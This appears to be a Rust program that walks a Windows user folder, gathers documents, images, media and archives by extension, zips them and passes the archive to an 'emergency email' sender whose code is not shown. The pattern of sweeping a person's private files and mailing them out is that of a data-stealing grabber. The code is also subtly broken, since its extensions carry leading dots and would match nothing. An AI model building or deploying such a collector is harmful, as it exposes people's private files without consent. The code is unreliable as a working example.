use std::fs::{File, read};
use std::io::{Write, BufWriter};
use std::path::{Path, PathBuf};

use walkdir::WalkDir;
use zip::write::FileOptions;

mod mail_send;

struct FileInfo {
    path: String, // relative path
    abs_path: PathBuf,
    size: u64,
}

fn get_files_with_extensions<P: AsRef<Path>>(root: P, extensions: &[&str]) -> Vec<FileInfo> {
    let root = root.as_ref().canonicalize().unwrap_or_else(|_| root.as_ref().to_path_buf());
    let mut files_info = Vec::new();

    for entry in WalkDir::new(&root)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_file())
    {
        let path = entry.path();
        if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
            if extensions.iter().any(|&x| x.eq_ignore_ascii_case(ext)) {
                if let (Ok(rel_path), Ok(meta)) = (path.strip_prefix(&root), path.metadata()) {
                    files_info.push(FileInfo {
                        path: rel_path.display().to_string(),
                        abs_path: path.to_path_buf(),
                        size: meta.len(),
                    });
                }
            }
        }
    }

    files_info
}

fn zip_files<P: AsRef<Path>>(output_path: P, files: &[FileInfo]) -> zip::result::ZipResult<()> {
    let file = File::create(output_path)?;
    let writer = BufWriter::new(file);
    let mut zip = zip::ZipWriter::new(writer);

    let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    for file_info in files {
        let data = read(&file_info.abs_path)?;
        zip.start_file(&file_info.path, options)?;
        zip.write_all(&data)?;
    }

    zip.finish()?;
    Ok(())
}

#[tokio::main]
async fn main() {
    let root_dir = "C:/Users/Keiko";
    let extensions = [".doc", ".docx", ".pdf", ".txt", ".rtf", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".wav", ".aac", ".mp4", ".avi", ".mov", ".zip", ".rar", ".html", ".htm", ".css", ".js"];
    let zip_output = "C:/Users/Keiko/Desktop/selected_files.zip";

    let files = get_files_with_extensions(root_dir, &extensions);
    let total_size: u64 = files.iter().map(|f| f.size).sum();

    for file in &files {
        println!("{} - {} bytes", file.path, file.size);
    }

    println!("\nTotal size: {} bytes", total_size);
    println!("Creating ZIP...");

    match zip_files(zip_output, &files) {
        Ok(_) => println!("ZIP archive created at: {}", zip_output),
        Err(e) => eprintln!("Failed to create ZIP: {:?}", e),
    }

    if let Err(err) = mail_send::send_emergency_email(zip_output).await {
        eprintln!("Failed to send email: {}", err);
    }
}